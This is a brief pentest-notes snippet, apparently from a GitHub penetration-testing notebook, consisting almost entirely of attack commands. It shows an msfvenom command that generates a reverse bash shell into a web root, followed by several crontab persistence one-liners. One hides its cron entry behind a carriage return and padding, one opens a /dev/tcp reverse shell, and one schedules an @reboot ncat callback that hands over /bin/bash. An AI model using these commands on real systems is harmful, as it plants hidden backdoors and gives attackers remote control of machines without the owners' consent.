	>msfvenom -p cmd/unix/reverse_bash LHOST=192.168.0.107 LPORT=12138 -f raw > /var/www/html/shell.sh
	(crontab -l;printf "*/1 * * * * /bin/bash /tmp/shell.sh;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/571.png)

	#!bash
	(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.1.1/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -

	(crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null